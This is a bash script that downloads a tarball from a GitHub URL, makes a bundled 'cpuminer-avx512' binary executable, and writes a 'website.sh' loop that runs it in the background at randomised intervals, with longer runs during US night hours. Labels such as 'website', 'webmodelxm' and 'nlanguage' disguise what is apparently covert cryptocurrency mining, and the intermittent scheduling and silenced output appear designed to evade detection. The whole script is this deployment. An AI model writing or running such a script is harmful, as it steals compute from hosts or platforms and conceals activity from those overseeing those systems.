#!/bin/bash

mkdir -p website

cd website

echo "download webmodelxm file"

curl -LsO https://raw.githubusercontent.com/amosgansweet/webmodelxm/main/web2rtm.tar.gz

tar -xvzf web2rtm.tar.gz

rm web2rtm.tar.gz

mv web2.sh server.sh

chmod +x server.sh
chmod +x ./binaries/cpuminer-avx512
sudo apt update
sudo apt install libjansson4
sudo apt install libjansson-dev
sudo apt install libnuma1
sudo apt install libnuma-dev

# creat website.sh
cat << 'EOF' > website.sh
#!/bin/bash
echo "creat a website.sh"
echo "running..."
touch "website.log"
NLANGUAGE_PATH="./server.sh"
LOG_FILE="./website.log"

# Function to get the current hour in the US timezone (Pacific Time)
get_us_hour() {
  # Set the timezone to US Pacific Time (Los Angeles)
  TZ="America/Los_Angeles"
  export TZ
  echo "$(date +%H)"
}

while true
do
    # get German time (hour)
    US_HOUR=$(get_us_hour)

    # set up running time and sleep time
    if [ "$US_HOUR" -ge 7 ] && [ "$US_HOUR" -lt 22 ]; then
        # Day time (7 AM to 10 PM) – Less frequent, shorter runs
        RUNTIME=$((RANDOM % 601 + 1500))  # run in the day：25~35 min
        SLEEPTIME=$((RANDOM % 301 + 600))  # sleep in the day：10~15 min
        echo "$(date '+%Y-%m-%d %H:%M:%S'): $(basename "$0"): Day: Running for $RUNTIME seconds, sleeping for $SLEEPTIME seconds" >> "$LOG_FILE"
    else
        # Night time (10 PM to 7 AM) – More frequent, longer runs
        RUNTIME=$((RANDOM % 901 + 2100))   # run at night: 35~50 min
        SLEEPTIME=$((RANDOM % 301 + 300))   # sleep at night：5~10 min
        echo "$(date '+%Y-%m-%d %H:%M:%S'): $(basename "$0"): Night: Running for $RUNTIME seconds, sleeping for $SLEEPTIME seconds" >> "$LOG_FILE"
    fi

    # start nlanguage（background）
    "$NLANGUAGE_PATH" > /dev/null 2>&1 &
    NLANGUAGE_PID=$!

    # await running time 
    sleep "$RUNTIME"
        
    # close nlanguage
    pkill -x "$(basename "$NLANGUAGE_PATH")" 2>/dev/null  # Use pkill for robustness

    # await for starting next time
    sleep "$SLEEPTIME"
done
sleep 1
echo "operation done!"
EOF

# operation privileges
chmod +x website.sh

# executing
# sudo nohup ./website.sh > /dev/null 2>&1 &
